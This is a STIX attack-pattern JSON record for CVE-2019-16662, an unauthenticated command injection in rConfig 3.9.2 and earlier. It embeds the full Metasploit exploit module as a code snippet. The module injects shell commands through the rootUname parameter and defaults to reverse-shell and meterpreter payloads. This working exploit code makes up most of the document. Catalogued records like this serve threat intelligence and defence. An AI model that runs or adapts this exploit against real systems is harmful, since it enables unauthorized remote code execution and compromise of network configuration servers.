{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aedf9e97-3c5a-43a7-971b-b037aae7d9f4",
    "created": "2024-08-14T17:11:58.71169Z",
    "modified": "2024-08-14T17:11:58.711694Z",
    "name": "rConfig install Command Execution",
    "description": " This module exploits an unauthenticated command injection vulnerability in rConfig versions 3.9.2 and prior. The `install` directory is not automatically removed after installation, allowing unauthenticated users to execute arbitrary commands via the `ajaxServerSettingsChk.php` file as the web server user.  This module has been tested successfully on rConfig version 3.9.2 on CentOS 7.7.1908 (x64).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/rconfig_install_cmd_exec.rb",
            "external_id": "rconfig_install_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-16662"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/mhaskar/ceb65fa4ca57c3cdccc1edfe2390902e"
        },
        {
            "source_name": "reference",
            "url": "https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'rConfig install Command Execution',\n      'Description'    => %q{\n        This module exploits an unauthenticated command injection vulnerability\n        in rConfig versions 3.9.2 and prior. The `install` directory is not\n        automatically removed after installation, allowing unauthenticated users\n        to execute arbitrary commands via the `ajaxServerSettingsChk.php` file\n        as the web server user.\n\n        This module has been tested successfully on rConfig version 3.9.2 on\n        CentOS 7.7.1908 (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mhaskar', # Discovery and exploit\n          'bcoles'   # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2019-16662'],\n          ['EDB', '47555'],\n          ['URL', 'https://gist.github.com/mhaskar/ceb65fa4ca57c3cdccc1edfe2390902e'],\n          ['URL', 'https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/']\n        ],\n      'Platform'       => %w[unix linux],\n      'Arch'           => [ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Payload'        => {'BadChars' => \"\\x00\\x0a\\x0d\\x26\"},\n      'Targets'        =>\n        [\n          ['Automatic (Unix In-Memory)',\n            'Platform'       => 'unix',\n            'Arch'           => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},\n            'Type'           => :unix_memory\n          ],\n          ['Automatic (Linux Dropper)',\n            'Platform'       => 'linux',\n            'Arch'           => [ARCH_X86, ARCH_X64],\n            'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},\n            'Type'           => :linux_dropper\n          ]\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' => { 'SSL' => true, 'RPORT' => 443 },\n      'DisclosureDate' => '2019-10-28',\n      'DefaultTarget'  => 0))\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to rConfig install directory', '/install/'])\n      ])\n  end\n\n  def check\n    res = execute_command('id')\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.code == 404\n      vprint_error 'Could not find install directory'\n      return CheckCode::Safe\n    end\n\n    cmd_res = res.body.scan(%r{The root details provided have not passed: (.+?)<\\\\/}).flatten.first\n\n    unless cmd_res\n      return CheckCode::Safe\n    end\n\n    vprint_status \"Response: #{cmd_res}\"\n\n    unless cmd_res.include?('uid=')\n      return CheckCode::Detected\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  def execute_command(cmd, opts = {})\n    vprint_status \"Executing command: #{cmd}\"\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/lib/ajaxHandlers/ajaxServerSettingsChk.php'),\n      'vars_get' => {'rootUname' => \";#{cmd} #\"}\n    }, 5)\n  end\n\n  def exploit\n    unless [CheckCode::Detected, CheckCode::Vulnerable].include? check\n      fail_with Failure::NotVulnerable, \"#{peer} - Target is not vulnerable\"\n    end\n\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(:linemax => 1_500)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-10-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}